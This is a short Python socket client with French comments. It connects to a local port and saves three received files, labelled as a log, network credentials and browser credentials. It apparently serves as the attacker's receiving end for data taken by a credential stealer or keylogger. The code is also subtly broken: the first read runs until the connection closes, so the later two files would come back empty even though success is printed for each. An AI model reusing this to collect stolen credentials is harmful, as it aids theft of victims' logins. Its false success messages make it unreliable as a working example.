import socket

def receive_file(conn, filename):
    with open(filename, 'wb') as file:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            file.write(data)


s = socket.socket()
host = socket.gethostname()
port= 12345
s.connect((host, port))
print("Connected to the server successfully")

receive_file(s, 'received_log.txt')
print("Log file received successfully.")

# réception du deuxième fichier
receive_file(s, 'received_network_cred.txt')
print("Network credentials file received successfully.")

# réception du troisième fichier
receive_file(s, 'received_browser_cred.txt')
print("Browser credentials file received successfully.")

s.close()


